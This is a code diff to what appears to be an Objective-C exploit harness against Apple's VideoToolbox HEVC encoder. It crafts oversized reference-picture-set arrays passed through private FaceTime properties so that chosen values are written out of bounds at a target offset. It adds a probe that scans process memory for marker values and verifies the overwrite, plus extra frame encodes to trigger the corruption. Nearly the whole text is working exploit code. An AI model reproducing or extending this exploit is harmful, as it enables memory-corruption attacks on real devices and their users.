@@ -447,14 +447,17 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         };
 
         // 1) Path A (d=0): single dict with S0 length 1620 (reaches 0x147b0 at i=1614..1617)
+        //    Zero transit elements so intermediate pINS fields (+0x13adc..0x147af) are not wedged.
         NSMutableArray *s0D0 = [NSMutableArray arrayWithCapacity:1620];
         for (int e = 0; e < 1620; e++) {
-            int16_t hv = (e >= idxS0_d0 && e < idxS0_d0 + 4) ? hwTag201[e - idxS0_d0] : hwAlign[e & 3];
+            int16_t hv = (e >= idxS0_d0 && e < idxS0_d0 + 4) ? hwTag201[e - idxS0_d0] : 0;
             [s0D0 addObject:@(hv)];
         }
         NSMutableArray *s1D0 = [NSMutableArray arrayWithCapacity:800];
         for (int e = 0; e < 800; e++) {
-            [s1D0 addObject:@(hwAlign[e & 3])];
+            int32_t sv = (e == idxS1_d0) ? (int32_t)(pFullAlign & 0xffffffffULL)
+                       : (e == idxS1_d0 + 1) ? (int32_t)(pFullAlign >> 32) : 0;
+            [s1D0 addObject:@(sv)];
         }
         NSDictionary *dictD0 = @{
             @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
@@ -472,7 +475,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             int len = (d == 3) ? 1088 : 16;
             NSMutableArray *s0 = [NSMutableArray arrayWithCapacity:(NSUInteger)len];
             for (int e = 0; e < len; e++) {
-                int16_t hv = (d == 3 && e >= idxS0_d3 && e < idxS0_d3 + 4) ? hwTag201[e - idxS0_d3] : hwAlign[e & 3];
+                int16_t hv = (d == 3 && e >= idxS0_d3 && e < idxS0_d3 + 4) ? hwTag201[e - idxS0_d3] : 0;
                 [s0 addObject:@(hv)];
             }
             [rps4 addObject:@{
@@ -481,7 +484,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                 @"NumPositivePics": @2,
                 @"DeltaPOCS0Minus1": s0,
                 @"UsedByCurrPicS0Flag": @3,
-                @"DeltaPOCS1Minus1": @[ @(hwAlign[0]), @(hwAlign[1]) ],
+                @"DeltaPOCS1Minus1": @[ @0, @0 ],
                 @"UsedByCurrPicS1Flag": @3,
             }];
         }
@@ -492,7 +495,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             int len = (d == 7) ? 376 : 32;
             NSMutableArray *s0b = [NSMutableArray arrayWithCapacity:(NSUInteger)len];
             for (int e = 0; e < len; e++) {
-                int16_t hv = (d == 7 && e >= idxS0_d7 && e < idxS0_d7 + 4) ? hwAlign[e - idxS0_d7] : hwAlign[e & 3];
+                int16_t hv = (d == 7 && e >= idxS0_d7 && e < idxS0_d7 + 4) ? hwAlign[e - idxS0_d7] : 0;
                 [s0b addObject:@(hv)];
             }
             [rps8 addObject:@{
@@ -501,7 +504,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                 @"NumPositivePics": @2,
                 @"DeltaPOCS0Minus1": s0b,
                 @"UsedByCurrPicS0Flag": @3,
-                @"DeltaPOCS1Minus1": @[ @(hwAlign[0]), @(hwAlign[1]) ],
+                @"DeltaPOCS1Minus1": @[ @0, @0 ],
                 @"UsedByCurrPicS1Flag": @3,
             }];
         }
@@ -511,7 +514,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         for (int d = 0; d < 10; d++) {
             NSMutableArray *s0c = [NSMutableArray arrayWithCapacity:16];
             for (int e = 0; e < 16; e++) {
-                int16_t hv = (d == 9 && e >= idxS0_d9 && e < idxS0_d9 + 4) ? hwAlign[e - idxS0_d9] : hwAlign[e & 3];
+                int16_t hv = (d == 9 && e >= idxS0_d9 && e < idxS0_d9 + 4) ? hwAlign[e - idxS0_d9] : 0;
                 [s0c addObject:@(hv)];
             }
             [rps10 addObject:@{
@@ -520,7 +523,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                 @"NumPositivePics": @2,
                 @"DeltaPOCS0Minus1": s0c,
                 @"UsedByCurrPicS0Flag": @3,
-                @"DeltaPOCS1Minus1": @[ @(hwAlign[0]), @(hwAlign[1]) ],
+                @"DeltaPOCS1Minus1": @[ @0, @0 ],
                 @"UsedByCurrPicS1Flag": @3,
             }];
         }
@@ -585,6 +588,143 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             }
             CFRelease(rpsAliasRef);
         }
+        // --- Set-time trajectory probe ---
+        // One set of 10 dicts with distinctive 4xint16 markers at every claimed landing
+        // (d=0 S0[1614..], d=3 S0[1080..], d=7 S0[368..], d=9 S0[12..] all target +0x147b0).
+        // If the inner strh loop is unbounded the marker qword appears in the session
+        // object (in-process) and we learn where the trajectory really lands. After the
+        // real P-align sets below we re-read those VAs (write->read verify).
+        uint64_t trajFindVA[8] = {0};
+        uint64_t trajFindVal[8] = {0};
+        int trajFindCount = 0;
+        {
+            const int16_t mkH[4][4] = {
+                { 0x1111, 0x2222, 0x3333, 0x4444 },
+                { 0x5555, 0x6666, 0x7777, (int16_t)0x8888 },
+                { (int16_t)0x9999, (int16_t)0xAAAA, (int16_t)0xBBBB, (int16_t)0xCCCC },
+                { (int16_t)0xDDDD, (int16_t)0xEEEE, (int16_t)0xFFFF, 0x0121 },
+            };
+            NSMutableArray *probeRps = [NSMutableArray arrayWithCapacity:10];
+            for (int d = 0; d < 10; d++) {
+                int len = (d == 0) ? 1620 : (d == 3) ? 1088 : (d == 7) ? 376 : 16;
+                int hitIdx = (d == 0) ? 1614 : (d == 3) ? 1080 : (d == 7) ? 368 : (d == 9) ? 12 : -1;
+                int mkRow = (d == 9) ? 3 : (d == 7) ? 2 : (d == 3) ? 1 : 0;
+                NSMutableArray *s0p = [NSMutableArray arrayWithCapacity:(NSUInteger)len];
+                for (int e = 0; e < len; e++) {
+                    int16_t hv = (hitIdx >= 0 && e >= hitIdx && e < hitIdx + 4)
+                        ? mkH[mkRow][e - hitIdx] : 0;
+                    [s0p addObject:@(hv)];
+                }
+                [probeRps addObject:@{
+                    @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
+                    @"NumNegativePics": @2, @"NumPositivePics": @2,
+                    @"DeltaPOCS0Minus1": s0p,
+                    @"UsedByCurrPicS0Flag": @3,
+                    @"DeltaPOCS1Minus1": @[ @0, @0 ],
+                    @"UsedByCurrPicS1Flag": @3,
+                }];
+            }
+            OSStatus probeSt = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"),
+                                                    (__bridge CFTypeRef)probeRps);
+            const uint64_t mkWant[4] = {
+                0x4444333322221111ULL, 0x8888777766665555ULL,
+                0xCCCCBBBBAAAA9999ULL, 0x0121FFFFEEEEDDDDULL
+            };
+            vm_address_t sAddr = 0;
+            uint8_t chunk[4096];
+            for (int iter = 0; iter < 4096 && trajFindCount < 8; iter++) {
+                vm_size_t rSize = 0;
+                uint32_t rDepth = 0;
+                vm_region_submap_info_data_64_t rInfo;
+                mach_msg_type_number_t rCount = VM_REGION_SUBMAP_INFO_COUNT_64;
+                if (vm_region_recurse_64(mach_task_self(), &sAddr, &rSize, &rDepth,
+                                         (vm_region_recurse_info_t)&rInfo, &rCount) != KERN_SUCCESS || rSize == 0) break;
+                if (rInfo.is_submap) { rDepth++; continue; }
+                if ((rInfo.protection & (VM_PROT_READ | VM_PROT_WRITE)) == (VM_PROT_READ | VM_PROT_WRITE)) {
+                    for (vm_size_t off = 0; off + 8 <= rSize && trajFindCount < 8; off += sizeof(chunk)) {
+                        vm_size_t outSz = 0;
+                        vm_size_t want = (rSize - off < sizeof(chunk)) ? (rSize - off) : sizeof(chunk);
+                        if (vm_read_overwrite(mach_task_self(), sAddr + off, want,
+                                              (vm_address_t)chunk, &outSz) != KERN_SUCCESS || outSz < 8) break;
+                        for (vm_size_t w = 0; w + 8 <= outSz && trajFindCount < 8; w += 4) {
+                            uint64_t v = *(uint64_t *)(chunk + w);
+                            for (int m = 0; m < 4; m++) {
+                                if (v == mkWant[m]) {
+                                    vm_address_t hitVA = sAddr + off + w;
+                                    BOOL dup = NO;
+                                    for (int k = 0; k < trajFindCount; k++) if (trajFindVA[k] == hitVA) { dup = YES; break; }
+                                    if (!dup) {
+                                        trajFindVA[trajFindCount] = hitVA;
+                                        trajFindVal[trajFindCount] = v;
+                                        uint64_t ctx[8] = {0};
+                                        vm_size_t csz = 0;
+                                        if (hitVA >= sAddr + 16 && hitVA + 48 <= sAddr + off + outSz) {
+                                            memcpy(ctx, chunk + w - 16, sizeof(ctx));
+                                        } else {
+                                            vm_read_overwrite(mach_task_self(), hitVA - 16, sizeof(ctx),
+                                                              (vm_address_t)ctx, &csz);
+                                        }
+                                        [report appendFormat:@"  [!] TRAJ-PROBE mk%c=0x%016llx @ va=0x%lx (reg=0x%lx+0x%lx tag=%u) ctx[-2..+5]: %016llx %016llx [%016llx] %016llx %016llx %016llx %016llx %016llx\n",
+                                         'A' + m, (unsigned long long)v, (unsigned long)hitVA,
+                                         (unsigned long)sAddr, (unsigned long)rSize, (unsigned)rInfo.user_tag,
+                                         (unsigned long long)ctx[0], (unsigned long long)ctx[1],
+                                         (unsigned long long)ctx[2], (unsigned long long)ctx[3],
+                                         (unsigned long long)ctx[4], (unsigned long long)ctx[5],
+                                         (unsigned long long)ctx[6], (unsigned long long)ctx[7]];
+                                        trajFindCount++;
+                                    }
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                }
+                if (sAddr + rSize <= sAddr) break;
+                sAddr += rSize;
+            }
+            [report appendFormat:@"trajProbe set=%d finds=%d (A=d0@1614 B=d3@1080 C=d7@368 D=d9@12)\n",
+             (int)probeSt, trajFindCount];
+        }
+        // --- P-frame completion control: same session config, NO UserRPS ---
+        {
+            NSMutableArray *cSink = [NSMutableArray array];
+            CFTypeRef cRet = CFRetain((__bridge CFTypeRef)cSink);
+            VTCompressionSessionRef cS = NULL;
+            NSDictionary *cSpec = @{ @"EnableUserRefForFacetime": @YES };
+            if (VTCompressionSessionCreate(kCFAllocatorDefault, W, H, kCMVideoCodecType_HEVC,
+                                           (__bridge CFDictionaryRef)cSpec, NULL, NULL,
+                                           SpriteAttsCB, (void *)cRet, &cS) == noErr && cS) {
+                VTSessionSetProperty(cS, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
+                VTSessionSetProperty(cS, CFSTR("EnableMultiReferenceP"), kCFBooleanTrue);
+                VTSessionSetProperty(cS, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
+                VTSessionSetProperty(cS, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@7);
+                VTCompressionSessionPrepareToEncodeFrames(cS);
+                CVPixelBufferRef cPb = [self makeBufferWidth:W height:H];
+                NSString *c0 = @"(skip)", *c1 = @"(skip)", *c2 = @"(skip)";
+                OSStatus ce0 = -1, ce1 = -1, ce2 = -1;
+                if (cPb) {
+                    ce0 = VTCompressionSessionEncodeFrame(cS, cPb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                    SpriteDrain(cS, cSink, 1, 500);
+                    @synchronized (cSink) { c0 = cSink.firstObject ?: @"(no cb)"; [cSink removeAllObjects]; }
+                    ce1 = VTCompressionSessionEncodeFrame(cS, cPb, CMTimeMake(1, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                    SpriteDrain(cS, cSink, 1, 120);
+                    ce2 = VTCompressionSessionEncodeFrame(cS, cPb, CMTimeMake(2, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                    VTCompressionSessionEncodeFrame(cS, cPb, CMTimeMake(3, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                    VTCompressionSessionEncodeFrame(cS, cPb, CMTimeMake(4, 30), kCMTimeInvalid, NULL, NULL, NULL);
+                    SpriteDrain(cS, cSink, 2, 800);
+                    @synchronized (cSink) {
+                        c1 = cSink.firstObject ?: @"(no cb)";
+                        c2 = (cSink.count > 1) ? cSink[1] : @"(no cb)";
+                    }
+                    CVPixelBufferRelease(cPb);
+                }
+                [report appendFormat:@"pctrl[noRps] enc0=%d(%@) enc1=%d(%@) enc2=%d(%@)\n",
+                 (int)ce0, c0, (int)ce1, c1, (int)ce2, c2];
+                VTCompressionSessionInvalidate(cS);
+                CFRelease(cS);
+            }
+            CFRelease(cRet);
+        }
         OSStatus setD0   = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[ dictD0 ]);
         OSStatus setArr4 = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps4);
         OSStatus setArr8 = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)rps8);
@@ -597,12 +737,23 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         }
         OSStatus setDpbPost = VTSessionSetProperty(victim, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)dpb34);
         OSStatus uPostSt = VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
+        VTSessionSetProperty(victim, CFSTR("NumOfTemporalLayer"), (__bridge CFNumberRef)@(pNtl));
         OSStatus nPostSt = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(pNtl));
         int rbPostNtl = -1;
         CFNumberRef rbN = NULL;
         if (VTSessionCopyProperty(victim, CFSTR("NumberOfTemporalLayers"), NULL, &rbN) == noErr && rbN) {
             CFNumberGetValue(rbN, kCFNumberIntType, &rbPostNtl);
             CFRelease(rbN);
+        }
+        // Write->read verify: did the P-align sets overwrite the trajectory-probe markers?
+        for (int k = 0; k < trajFindCount; k++) {
+            uint64_t cur = 0;
+            vm_size_t vsz = 0;
+            if (vm_read_overwrite(mach_task_self(), trajFindVA[k], 8, (vm_address_t)&cur, &vsz) == KERN_SUCCESS && vsz == 8) {
+                [report appendFormat:@"  trajProbe reread va=0x%lx: 0x%016llx -> 0x%016llx %@\n",
+                 (unsigned long)trajFindVA[k], (unsigned long long)trajFindVal[k], (unsigned long long)cur,
+                 (cur != trajFindVal[k]) ? @"OVERWRITTEN" : @"(same)"];
+            }
         }
 
         // Snapshot all discovered candidate pages (if available) before Inter-frame encode and teardown
@@ -622,27 +773,44 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         }
 
         // Encode Inter-frame (Frame 1, P-frame) to force AppleAVE2 to consume UserRPSForFaceTime & DPB slot[0]
-        OSStatus eP = -1;
-        NSString *cbP = @"(no cb)";
+        // Trailing Frames 2..4 flush the B-frame reorder queue (MaxFrameDelayCount=3) so held P-frames emit callbacks.
+        OSStatus eP = -1, eP2 = -1, eP3 = -1;
+        NSString *cbP = @"(no cb)", *cbP2 = @"(skip)", *cbP3 = @"(skip)";
         CVPixelBufferRef pbP = [self makeBufferWidth:W height:H];
         if (pbP) {
+            NSDictionary *pFrameProps = @{
+                (id)kVTEncodeFrameOptionKey_ForceKeyFrame: @NO,
+                @"ForceSliceRPS": (id)kCFBooleanTrue,
+                @"ShortTermRefPicSetSPSFlag": (id)kCFBooleanFalse,
+                @"ShortTermRefPicSetIdx": @0,
+            };
             @synchronized (vSink) { [vSink removeAllObjects]; }
-            NSDictionary *pFrameProps = @{ (id)kVTEncodeFrameOptionKey_ForceKeyFrame: @NO };
             eP = VTCompressionSessionEncodeFrame(victim, pbP, CMTimeMake(1, 30), kCMTimeInvalid,
                                                  (__bridge CFDictionaryRef)pFrameProps, NULL, NULL);
-            SpriteDrain(victim, vSink, 1, 500);
+            SpriteDrain(victim, vSink, 1, 120);
+            eP2 = VTCompressionSessionEncodeFrame(victim, pbP, CMTimeMake(2, 30), kCMTimeInvalid,
+                                                  (__bridge CFDictionaryRef)pFrameProps, NULL, NULL);
+            eP3 = VTCompressionSessionEncodeFrame(victim, pbP, CMTimeMake(3, 30), kCMTimeInvalid,
+                                                  (__bridge CFDictionaryRef)pFrameProps, NULL, NULL);
+            VTCompressionSessionEncodeFrame(victim, pbP, CMTimeMake(4, 30), kCMTimeInvalid,
+                                            (__bridge CFDictionaryRef)pFrameProps, NULL, NULL);
+            VTCompressionSessionEncodeFrame(victim, pbP, CMTimeMake(5, 30), kCMTimeInvalid,
+                                            (__bridge CFDictionaryRef)pFrameProps, NULL, NULL);
+            SpriteDrain(victim, vSink, 3, 900);
             @synchronized (vSink) {
-                cbP = vSink.firstObject ?: @"(no cb)";
+                cbP  = (vSink.count > 0) ? vSink[0] : @"(no cb)";
+                cbP2 = (vSink.count > 1) ? vSink[1] : @"(no cb)";
+                cbP3 = (vSink.count > 2) ? vSink[2] : @"(no cb)";
             }
             CVPixelBufferRelease(pbP);
         }
 
-        [report appendFormat:@"pcontrol v3 victim=%p ntl=%d(P=0x%016llx -> x0=0x%016llx) pm=%d nPre7=%d prep=%d enc0=%d(%@) enc1=%d(%@) nPost=%d/%d(rb=%d)\n",
-         (void *)victim, pNtl, pFullAlign, x0ExpectedAlign, (int)pmSt, (int)nPreSt, (int)vPrep, (int)e0, cb0, (int)eP, cbP, (int)uPostSt, (int)nPostSt, rbPostNtl];
+        [report appendFormat:@"pcontrol v3 victim=%p ntl=%d(P=0x%016llx -> x0=0x%016llx) pm=%d nPre7=%d prep=%d enc0=%d(%@) enc1=%d(%@) enc2=%d(%@) enc3=%d(%@) nPost=%d/%d(rb=%d)\n",
+         (void *)victim, pNtl, pFullAlign, x0ExpectedAlign, (int)pmSt, (int)nPreSt, (int)vPrep, (int)e0, cb0, (int)eP, cbP, (int)eP2, cbP2, (int)eP3, cbP3, (int)uPostSt, (int)nPostSt, rbPostNtl];
         [report appendFormat:@"pcontrol set d0(S0[1614])=%d arr4(S0[1080])=%d arr8(S0[368])=%d arr10(S0[12])=%d dpb34=%d/%d(oobPair16=0x%016llx)\n",
          (int)setD0, (int)setArr4, (int)setArr8, (int)setArr10, (int)setDpbPre, (int)setDpbPost, rbOobPair16];
-        [self journal:[NSString stringWithFormat:@"PCONTROL_V3 ntl=%d d0=%d arr4=%d arr8=%d arr10=%d dpb34=%d enc0=%d(%@) enc1=%d(%@)",
-                       pNtl, (int)setD0, (int)setArr4, (int)setArr8, (int)setArr10, (int)setDpbPost, (int)e0, cb0, (int)eP, cbP]];
+        [self journal:[NSString stringWithFormat:@"PCONTROL_V3 ntl=%d d0=%d arr4=%d arr8=%d arr10=%d dpb34=%d enc0=%d(%@) enc1=%d(%@) enc2=%d(%@) enc3=%d(%@) trajFinds=%d",
+                       pNtl, (int)setD0, (int)setArr4, (int)setArr8, (int)setArr10, (int)setDpbPost, (int)e0, cb0, (int)eP, cbP, (int)eP2, cbP2, (int)eP3, cbP3, trajFindCount]];
         VTCompressionSessionInvalidate(victim);
         CFRelease(victim);
         CFRelease(retainedVSink);
@@ -902,15 +1070,17 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
             (int16_t)((pCand64 >> 32) & 0xffffULL),
             (int16_t)((pCand64 >> 48) & 0xffffULL)
         };
-        NSMutableArray *s0Oob32 = [NSMutableArray arrayWithCapacity:32];
-        NSMutableArray *s1Oob32 = [NSMutableArray arrayWithCapacity:32];
-        for (int k = 0; k < 32; k++) {
-            [s0Oob32 addObject:@(pHw[k & 3])];
-            [s1Oob32 addObject:@(pHw[k & 3])];
+        NSMutableArray *s0Oob32 = [NSMutableArray arrayWithCapacity:16];
+        NSMutableArray *s1Oob32 = [NSMutableArray arrayWithCapacity:2];
+        for (int k = 0; k < 16; k++) {
+            [s0Oob32 addObject:@0];
         }
+        [s1Oob32 addObject:@0];
+        [s1Oob32 addObject:@0];
         NSMutableArray *s0Slot0_376 = [NSMutableArray arrayWithCapacity:376];
         for (int k = 0; k < 376; k++) {
-            [s0Slot0_376 addObject:@(pHw[k & 3])];
+            int16_t hv = (k >= 368 && k < 372) ? pHw[k - 368] : 0;
+            [s0Slot0_376 addObject:@(hv)];
         }
         NSDictionary *rpsOob = @{
             @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
@@ -1087,25 +1257,29 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                 (int16_t)((vPAlign >> 32) & 0xffffULL),
                 (int16_t)((vPAlign >> 48) & 0xffffULL)
             };
-            NSMutableArray *vS0Short = [NSMutableArray arrayWithCapacity:32];
-            for (int k = 0; k < 32; k++) [vS0Short addObject:@(vHw[k & 3])];
+            NSMutableArray *vS0Short = [NSMutableArray arrayWithCapacity:16];
+            for (int k = 0; k < 16; k++) [vS0Short addObject:@0];
             NSMutableArray *vS0Slot0 = [NSMutableArray arrayWithCapacity:376];
-            for (int k = 0; k < 376; k++) [vS0Slot0 addObject:@(vHw[k & 3])];
+            for (int k = 0; k < 376; k++) {
+                int16_t hv = (k >= 368 && k < 372) ? vHw[k - 368] : 0;
+                [vS0Slot0 addObject:@(hv)];
+            }
             NSDictionary *vRpsShort = @{
                 @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
                 @"NumNegativePics": @2, @"NumPositivePics": @2,
                 @"DeltaPOCS0Minus1": vS0Short, @"UsedByCurrPicS0Flag": @3,
-                @"DeltaPOCS1Minus1": @[ @(vHw[0]), @(vHw[1]) ], @"UsedByCurrPicS1Flag": @3,
+                @"DeltaPOCS1Minus1": @[ @0, @0 ], @"UsedByCurrPicS1Flag": @3,
             };
             NSDictionary *vRpsHit = @{
                 @"InterRefPicSetPredictionFlag": (id)kCFBooleanFalse,
                 @"NumNegativePics": @2, @"NumPositivePics": @2,
                 @"DeltaPOCS0Minus1": vS0Slot0, @"UsedByCurrPicS0Flag": @3,
-                @"DeltaPOCS1Minus1": @[ @(vHw[0]), @(vHw[1]) ], @"UsedByCurrPicS1Flag": @3,
+                @"DeltaPOCS1Minus1": @[ @0, @0 ], @"UsedByCurrPicS1Flag": @3,
             };
             OSStatus stRps = VTSessionSetProperty(victim, CFSTR("UserRPSForFaceTime"),
                                                   (__bridge CFTypeRef)@[ vRpsShort, vRpsShort, vRpsShort, vRpsShort, vRpsShort, vRpsShort, vRpsShort, vRpsHit ]);
             OSStatus stPostUsage = VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
+            VTSessionSetProperty(victim, CFSTR("NumOfTemporalLayer"), (__bridge CFNumberRef)@(vntl));
             OSStatus stPostPub = VTSessionSetProperty(victim, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(vntl));
             int postEncNtl = -1;
             CFNumberRef rbPost = NULL;
@@ -1113,20 +1287,33 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                 CFNumberGetValue(rbPost, kCFNumberIntType, &postEncNtl);
                 CFRelease(rbPost);
             }
-            OSStatus e1 = -1;
-            NSString *cb1 = @"(skip)";
+            OSStatus e1 = -1, e2 = -1;
+            NSString *cb1 = @"(skip)", *cb2 = @"(skip)";
             if (vntl < 16463) {
                 @synchronized (vSink) { [vSink removeAllObjects]; }
-                NSDictionary *pFrameProps = @{ (id)kVTEncodeFrameOptionKey_ForceKeyFrame: @NO };
+                NSDictionary *pFrameProps = @{
+                    (id)kVTEncodeFrameOptionKey_ForceKeyFrame: @NO,
+                    @"ForceSliceRPS": @YES,
+                    @"ShortTermRefPicSetSPSFlag": @NO,
+                    @"ShortTermRefPicSetIdx": @0,
+                };
                 e1 = VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(1, 30), kCMTimeInvalid,
                                                      (__bridge CFDictionaryRef)pFrameProps, NULL, NULL);
-                if (e1 == noErr) {
-                    SpriteDrain(victim, vSink, 1, 500);
+                SpriteDrain(victim, vSink, 1, 150);
+                e2 = VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(2, 30), kCMTimeInvalid,
+                                                     (__bridge CFDictionaryRef)pFrameProps, NULL, NULL);
+                VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(3, 30), kCMTimeInvalid,
+                                                (__bridge CFDictionaryRef)pFrameProps, NULL, NULL);
+                VTCompressionSessionEncodeFrame(victim, pb, CMTimeMake(4, 30), kCMTimeInvalid,
+                                                (__bridge CFDictionaryRef)pFrameProps, NULL, NULL);
+                SpriteDrain(victim, vSink, 2, 1000);
+                @synchronized (vSink) {
+                    cb1 = vSink.firstObject ?: @"(no cb)";
+                    cb2 = (vSink.count > 1) ? vSink[1] : @"(no cb)";
                 }
-                @synchronized (vSink) { cb1 = vSink.firstObject ?: @"(no cb)"; }
             }
-            [report appendFormat:@"first-encode trigger (NTL=%d) -> enc0=%d(%@) rps=%d postLatch=%d/%d(POST_ENC=%d) enc1=%d(%@)\n",
-             vntl, (int)e0, cb0, (int)stRps, (int)stPostUsage, (int)stPostPub, postEncNtl, (int)e1, cb1];
+            [report appendFormat:@"first-encode trigger (NTL=%d) -> enc0=%d(%@) rps=%d postLatch=%d/%d(POST_ENC=%d) enc1=%d(%@) enc2=%d(%@)\n",
+             vntl, (int)e0, cb0, (int)stRps, (int)stPostUsage, (int)stPostPub, postEncNtl, (int)e1, cb1, (int)e2, cb2];
         }
         VTCompressionSessionInvalidate(victim);
         CFRelease(victim);
